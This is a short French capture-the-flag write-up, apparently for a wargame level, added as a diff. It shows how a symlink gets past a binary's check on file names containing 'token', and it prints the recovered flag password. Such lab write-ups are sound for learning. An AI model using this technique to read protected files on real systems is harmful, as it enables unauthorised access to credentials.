@@ -1,0 +1,20 @@
+On voit dans le binaire
+
+tokenYou may not access '%s'
+
+
+Donc on se doute que c’est un truc du genre
+
+if (name == “token”) exit();
+
+Donc on voudrai copier le fichier pour le renommer ;mais on n’a pas les droits, du coup on essaye en faisant un lien symbolique.
+
+ln -s ~/token /tmp/hiboux
+./level08 /tmp/hiboux
+
+Et paf on a le pass pour su flag08
+
+
+quif5eloekouj29ke0vouxean
+
+Ensuite getflag et boum ouaiouai
